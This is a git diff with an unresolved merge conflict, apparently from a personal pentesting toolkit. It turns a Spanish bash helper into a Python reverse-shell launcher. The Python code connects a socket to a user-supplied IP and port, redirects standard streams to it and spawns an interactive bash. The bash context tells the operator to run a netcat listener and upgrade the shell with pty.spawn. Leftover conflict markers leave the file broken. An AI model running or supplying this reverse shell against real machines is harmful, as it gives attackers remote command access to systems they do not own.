@@ -1,19 +1,33 @@
-#!/bin/bash
-#version en bash de sheldon-all-info en bash
+#!/usr/bin/env python3
 
-echo "version en bash de sheldon"
+from os import dup2
+from subprocess import run
+import socket
 
+# Function to print with color
+def print_color(message, color_code):
+    print("\033[" + str(color_code) + "m" + message + "\033[0m")
 
+# Add spaces for clarity
+print_color("", 94)
+print_color("_________________________________________________________", 94)
+print_color("", 94)
 
-ip="$1"
-[ -z "$ip" ] && echo "Uso: $0 <IP>" && exit 1
+# Message
+print_color("Run nc nvlp 1234 on the other machine", 95)
 
-cyan="\033[94m"; mag="\033[95m"; yellow="\033[93m"; green="\033[92m"; red="\033[91m"; reset="\033[0m"
+# Ask for the IP
+ip = input("\033[93mEnter the IP address: \033[0m")
 
-echo -e "${cyan}_________________________________________________________${reset}"
-echo -e "${mag}En la otra máquina ejecuta:${reset}"
-echo -e "${yellow}nc -nlvp 1234${reset}"
+# Ask for the port
+default_port = 1234
+port_input = input("\033[93mDefault port 1234? [c] to change: \033[0m")
+if port_input.lower() == 'c':
+    port = int(input("\033[93mEnter the port: \033[0m"))
+else:
+    port = default_port
 
+<<<<<<< Updated upstream
 echo -e "${yellow}python3 -c 'import pty; pty.spawn("/bin/bash")'${reset}"
 echo -e "${yellow}export TERM=xterm${reset}"
 echo -e "${yellow}O tambien el binario listener${reset}"
@@ -49,3 +63,19 @@ while true; do
   echo -e "${red}Conexión perdida, esperando nuevamente...${reset}"
   sleep 1
 done
+=======
+# Confirm before executing
+execute = input(f"\033[92mExecute connection to {ip} on port {port}? [Y/n']: \033[0m").strip().lower()
+if execute in ['', 'y']:
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        s.connect((ip, port))
+        dup2(s.fileno(), 0)
+        dup2(s.fileno(), 1)
+        dup2(s.fileno(), 2)
+        run(["/bin/bash", "-i"])
+    except Exception as e:
+        print_color(f"Error connecting: {e}", 91)
+else:
+    print_color("Operation cancelled.", 91)
+>>>>>>> Stashed changes
